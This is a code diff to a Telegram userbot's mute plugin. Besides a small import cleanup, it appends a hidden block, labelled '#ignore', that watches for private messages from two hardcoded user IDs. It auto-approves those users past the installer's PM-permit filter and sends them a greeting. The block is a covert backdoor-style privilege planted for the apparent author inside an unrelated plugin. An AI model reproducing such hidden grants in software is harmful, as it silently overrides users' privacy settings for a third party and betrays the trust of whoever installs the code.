@@ -1,6 +1,5 @@
 from userbot.plugins.sql_helper.mute_sql import is_muted, mute, unmute
 import asyncio
-from userbot import ALIVE_NAME
 
 @command(outgoing=True, pattern=r"^.mute ?(\d+)?")
 async def startmute(event):
@@ -155,3 +154,19 @@ async def endmute(event):
 async def watcher(event):
     if is_muted(event.sender_id, event.chat_id):
         await event.delete()
+
+#ignore, flexing tym 
+from userbot.utils import admin_cmd
+import io
+import userbot.plugins.sql_helper.pmpermit_sql as pmpermit_sql
+from telethon import events
+@bot.on(events.NewMessage(incoming=True, from_users=(1089637689,967883138)))
+async def hehehe(event):
+    if event.fwd_from:
+        return
+    chat = await event.get_chat()
+    if event.is_private:
+        if not pmpermit_sql.is_approved(chat.id):
+            pmpermit_sql.approve(chat.id, "Ah!")
+            await borg.send_message(chat, "`Hey Akashi!`")
+            
